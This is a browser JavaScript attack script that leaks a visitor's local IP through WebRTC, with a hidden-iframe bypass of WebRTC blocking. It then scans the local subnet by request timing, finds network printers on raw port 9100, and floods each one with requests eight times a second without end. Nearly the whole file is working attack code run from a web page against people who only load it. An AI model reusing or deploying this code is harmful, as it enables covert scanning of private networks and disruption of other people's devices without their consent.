//credits:
//https://github.com/beefproject/beef/blob/master/modules/network/identify_lan_subnets/command.js
//https://github.com/diafygi/webrtc-ips

testing = false;

toggleTesting = function() {
    testing = !testing;
    var button = document.getElementById('testButton');
    if (testing) {
        button.innerText = 'turn off testing mode';
    } else {
        button.innerText = 'turn on testing mode';
    }
}

execute = function() {

    function doScan(localIp, timeout, onDiscover) {

        var concurrency = 24; //amount of requests to run at the same time
        var port = 15349; //use random port to ensure no connections actual are made, only attempts

        var doRequest = function(host) {
            var d = new Date();
            var xhr = new XMLHttpRequest();
            xhr.timeout = timeout;
            xhr.onreadystatechange = function() {
                if (xhr.readyState == 4) {
                    var time = new Date().getTime() - d.getTime();
                    var aborted = false;
                    xhr.onabort = function() {
                        aborted = true;
                    }
                    xhr.onloadend = function() {
                        if (time > 2 && time < (timeout - 2) && aborted === false) {
                            onDiscover(host);
                        }
                    }
                }
            }
            xhr.open("GET", "https://" + host + ":" + port, true);
            xhr.send();
        }

        var requests = [];

        var localIpStart = localIp.match(/(\d+\.){3}/)[0];

        //ip addresses don't end with 255 or 0
        for (var end = 1; end <= 254; end++) {
            requests.push(localIpStart + end);
        }

        // process queue
        var count = requests.length;
        var handle = setInterval(function() {
            if (requests.length > 0) {
                doRequest(requests.pop());
            }
        }, timeout / concurrency);

    }

    var printerPort = 9100;
    var testingPort = 9123;
    
    function getPort () {
        if (testing) {
            return testingPort;
        } else {
            return printerPort;
        }
    }
    
    function detectPrinter(ip, timeout, onDiscover) {
        var d = new Date();
        var xhr = new XMLHttpRequest();
        xhr.timeout = timeout;
        xhr.ontimeout = function() {
            var time = new Date().getTime() - d.getTime();
            if (Math.abs(timeout - time) <= 2) {
                onDiscover(ip);
            }
        };
        xhr.open('GET', 'https://' + ip + ':' + getPort(), true);
        xhr.send();
    }

    function spamPrinter(ip) {
        var request_timeout = 1000;
        var interval = 1000 / 8;
        setInterval(function() {
            var xhr = new XMLHttpRequest();
            xhr.timeout = request_timeout;
            xhr.open('GET', 'https://' + ip + ':' + getPort(), true);
            xhr.send();
        }, interval);
    }

    function getIPs(callback) {
        var ip_dups = {};

        //compatibility for firefox and chrome
        var RTCPeerConnection = window.RTCPeerConnection ||
            window.mozRTCPeerConnection ||
            window.webkitRTCPeerConnection;
        var useWebKit = !!window.webkitRTCPeerConnection;

        //bypass naive webrtc blocking using an iframe
        if (!RTCPeerConnection) {
            //NOTE: you need to have an iframe in the page right above the script tag
            //
            //<iframe id="iframe" sandbox="allow-same-origin" style="display: none"></iframe>
            //<script>...getIPs called in here...
            //
            var win = iframe.contentWindow;
            RTCPeerConnection = win.RTCPeerConnection ||
                win.mozRTCPeerConnection ||
                win.webkitRTCPeerConnection;
            useWebKit = !!win.webkitRTCPeerConnection;
        }

        //minimal requirements for data connection
        var mediaConstraints = {
            optional: [{
                RtpDataChannels: true
            }]
        };

        var servers = {
            iceServers: []
        };

        //construct a new RTCPeerConnection
        var pc = new RTCPeerConnection(servers, mediaConstraints);

        function handleCandidate(candidate) {
            //match just the IP address
            var ip_regex = /[0-9]{1,3}(\.[0-9]{1,3}){3}/
            var ip_addr = ip_regex.exec(candidate)[0];

            //remove duplicates
            if (ip_dups[ip_addr] === undefined)
                callback(ip_addr);

            ip_dups[ip_addr] = true;
        }

        //listen for candidate events
        pc.onicecandidate = function(ice) {

            //skip non-candidate events
            if (ice.candidate && ice.candidate.candidate)
                handleCandidate(ice.candidate.candidate);
        };

        //create a bogus data channel
        pc.createDataChannel("");

        //create an offer sdp
        pc.createOffer(function(result) {

            //trigger the stun server request
            pc.setLocalDescription(result, function() {}, function() {});

        }, function() {});
    }

    var out = document.getElementById('log');
    var timeout = 750;
    var detectPrinterTimeout = timeout * 2;
    var foundIp = false;
    var findIpTimeout = 200;
    
    out.innerText += '\nexecuting';
    
    getIPs(function(localIp) {
        doScan(localIp, timeout, function(ip) {
            foundIp = true;
            out.innerText += '\ndiscovered host ' + ip;
            detectPrinter(ip, detectPrinterTimeout, function() {
                out.innerText += '\ndiscovered printer: ' + ip;
                spamPrinter(ip);
            });
        });
    });
    setTimeout(function() {
    	if (!foundIp) {
            out.innerText += '\nerror: unable to get local ip address in ' + findIpTimeout + ' ms';
        }
    }, findIpTimeout);

};
